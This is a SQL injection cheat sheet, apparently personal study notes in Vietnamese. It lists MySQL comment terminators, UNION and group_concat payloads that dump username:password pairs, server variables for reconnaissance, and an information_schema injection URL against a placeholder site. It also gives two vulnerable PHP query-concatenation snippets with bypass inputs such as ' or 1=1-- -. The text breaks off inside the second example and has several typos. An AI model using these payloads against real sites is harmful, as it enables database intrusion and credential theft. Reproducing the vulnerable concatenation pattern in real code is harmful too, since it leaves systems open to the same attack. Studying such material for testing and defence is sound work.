# SQL INJECTION

```sh
--	:	MySQL Linux Style
--+	:	MySQL Windows Style
#	:	Hash (URL encode while use)
--+-	:	SQL Comment
;%00	:	Null Byte
`	:	Backtick
```

- union có tác dụng kết nối các truy vấn đầu vào, và có truy vấn đó đều xuất ra một cột

- limit dùng để đặt giới hạn và truy vấn vào từng cột : 

- concat dùng để gom lấy lun một nhóm: concat(username,0x3a,password)

- Với lượng dữ liệu lớn ta sẽ dùng: `select group_concat(username,0x3a,password,0x0a)from (select username,password from users limit 0,100)`; ( Chứng năng group_concat chỉ có giới hạn trong 1024 kí tự)

- Ta có thể dùng CAST để tăng buffer lên: `SELECT CAST(GROUP_CONCAT(username,0x3a,password,0x0a) AS CHAR(2048)) FROM users;`

- Một số varialbe/function có thể đưọc khai thác
```sh
Variable/Function		Output
@@hostname	:	Current Hostname
@@tmpdir	:	Tept Directory
@@datadir	:	Data Directory
@@version	:	Version of DB
@@basedir	:	Base Directory
user()	:	Current User
database()	:	Current Database
version()	:	Version
schema()	:	current Database
UUID()	:	System UUID key
current_user()	:	Current User
current_user	:	Current User
system_user()	:	Current Sustem user
session_user()	:	Session user
@@GLOBAL.have_symlink	:	Check if Symlink Enabled or Disabled
@@GLOBAL.have_ssl	:	Check if it have ssl or not
```
```sh
Query : Select table_name from information_schema.talbes where table_schema='databasename'

Query for Current DB: Select table_name from information_schema.tables where table_schema=database()

Injection : http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+
```




## Example1
-----------------------------------------------------------------------------

Code review:
```sh
<?php
.... ...
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";   
$result = mysql_query($sql);
.... ...
?>
```

- Truy vấn đầu vào name=' or 1=1-- -
- Lưu ý với comment `--` thường gây ra vấn đề nếu sau nó không có khoảng trắng
---------------------------------------------------------------------------------------

## Example2
--------------------------------------------------------------------------------------------

Code review:
```sh
<?php
... ..
if (preg_match('//',$_GET["name"])){
	die("ERROR NO SPACE");
}
$sql="SELECT * From users  where name='";
 $sql .= $_GET["name"]."'";

  $result = mysql_query($sql);


?>

- Khi truy vấn với khoảng rưáng sẽ báo lỗi
